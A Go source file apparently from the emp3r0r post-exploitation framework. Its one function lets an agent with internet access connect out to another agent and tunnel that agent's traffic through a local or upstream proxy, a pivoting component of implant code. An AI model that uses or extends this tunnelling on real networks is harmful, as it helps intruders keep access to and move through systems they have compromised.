package agent

import (
	"context"
	"fmt"
	"log"
	"strconv"

	"github.com/jm33-m0/emp3r0r/core/lib/tun"
)

// StartReverseProxy connect to an agent, provide reverse proxy for it, target format: ip
func StartReverseProxy(target string, ctx context.Context, cancel context.CancelFunc) error {
	// the port to connect to
	p, err := strconv.Atoi(ProxyPort)
	if err != nil {
		return fmt.Errorf("WTF? ProxyPort %s: %v", ProxyPort, err)
	}
	reverseProxyPort := p + 1
	target = fmt.Sprintf("%s:%d", target, reverseProxyPort)

	// as an agent who already have internet or a working proxy
	hasInternet := tun.HasInternetAccess()
	isProxyOK := tun.IsProxyOK(AgentProxy)
	if !hasInternet && !isProxyOK {
		return fmt.Errorf("We dont have any internet to share")
	}
	// if addr is invalid
	if !tun.ValidateIPPort(target) {
		return fmt.Errorf("Invalid address %s, no reverse proxy will be provided", target)
	}

	// provide a reverse proxy
	for p, cancelfunc := range ReverseConns {
		if target == p {
			cancelfunc() // cancel existing connection
		}
	}
	// where to forward? local proxy or remote one?
	toAddr := "127.0.0.1:" + ProxyPort
	if !hasInternet {
		toAddr = AgentProxy
	}
	ReverseConns[target] = cancel
	err = tun.TCPConnJoin(ctx, cancel, target, toAddr)
	if err != nil {
		log.Printf("TCPConnJoin: %v", err)
	}

	return nil
}
